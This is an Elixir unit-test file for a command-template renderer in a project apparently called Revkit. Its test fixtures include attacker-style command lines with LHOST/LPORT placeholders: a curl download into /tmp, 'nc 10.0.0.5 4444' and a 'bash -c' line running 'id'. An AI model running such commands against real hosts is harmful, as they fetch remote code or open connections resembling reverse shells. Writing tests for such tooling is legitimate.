defmodule Revkit.Engine.TemplateTest do
  use ExUnit.Case, async: true

  alias Revkit.Engine.Template

  describe "variables/1" do
    test "returns unique names in first-seen order" do
      template = "curl {{LHOST}}:{{LPORT}}/{{LPORT}} -o /tmp/{{FILE}}"

      assert Template.variables(template) == ["LHOST", "LPORT", "FILE"]
    end

    test "ignores malformed and non-placeholder braces" do
      assert Template.variables("echo {LHOST} {{}} {{9BAD}} {{ok}}") == ["ok"]
    end

    test "returns an empty list without placeholders" do
      assert Template.variables("echo hello") == []
    end
  end

  describe "render/2" do
    test "substitutes string values" do
      assert Template.render("nc {{LHOST}} {{LPORT}}", %{
               "LHOST" => "10.0.0.5",
               "LPORT" => "4444"
             }) == {:ok, "nc 10.0.0.5 4444"}
    end

    test "supports repeated placeholders and atom-keyed variables" do
      assert Template.render("{{A}}-{{A}}", %{A: "x"}) == {:ok, "x-x"}
    end

    test "preserves shell metacharacters literally" do
      assert Template.render("bash -c '{{CMD}}'", %{"CMD" => "echo $HOME && id"}) ==
               {:ok, "bash -c 'echo $HOME && id'"}
    end

    test "returns every missing or blank variable" do
      assert Template.render("{{A}} {{B}} {{C}}", %{"A" => "x", "B" => ""}) ==
               {:error, {:missing_variables, ["B", "C"]}}
    end

    test "renders templates without placeholders" do
      assert Template.render("echo hi", %{}) == {:ok, "echo hi"}
      assert Template.render("", %{}) == {:ok, ""}
    end
  end
end
